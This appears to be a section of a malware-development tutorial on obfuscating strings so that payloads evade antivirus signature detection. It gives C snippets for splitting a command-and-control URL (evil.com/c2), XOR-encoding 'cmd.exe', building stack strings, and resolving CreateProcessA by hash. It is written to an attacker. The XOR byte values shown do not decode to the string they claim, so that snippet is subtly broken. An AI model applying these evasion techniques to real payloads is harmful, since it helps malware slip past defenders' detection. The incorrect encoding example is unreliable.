## Why Obfuscate Strings?

Strings like URLs, API names, and error messages are the first thing AV engines look for. If your payload contains `VirtualAllocEx` or `https://evil.com/c2`, signature detection will catch it immediately.

### Technique 1: String Splitting
```c
// Bad — obvious string
char* url = "https://evil.com/c2";

// Better — split and concatenate at runtime
char* url = (char*)malloc(22);
strcpy(url, "https://evil");
strcat(url, ".com/c2");
```

### Technique 2: XOR String Encoding
```c
// Store XOR'd strings, decode at runtime
char encoded[] = {0x1d, 0x0c, 0x0c, 0x09, ...}; // "cmd.exe" XOR 0x05
char key = 0x05;
for (int i = 0; i < sizeof(encoded); i++) {
    encoded[i] ^= key;
}
```

### Technique 3: Stack String Construction
```c
// Build string character by character on the stack
char cmd[8];
cmd[0] = 'c'; cmd[1] = 'm'; cmd[2] = 'd';
cmd[3] = '.'; cmd[4] = 'e'; cmd[5] = 'x';
cmd[6] = 'e'; cmd[7] = '\0';
```

### Technique 4: Hash-based API Resolution
```c
// Instead of importing CreateProcessA by name,
// resolve it by hash of the name
typedef BOOL (WINAPI *CreateProcess_t)(...);
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
CreateProcess_t pCreateProcess = 
    (CreateProcess_t)ResolveFunctionByHash(hKernel32, 0x...);
```

This prevents the string `CreateProcessA` from appearing in your binary at all.
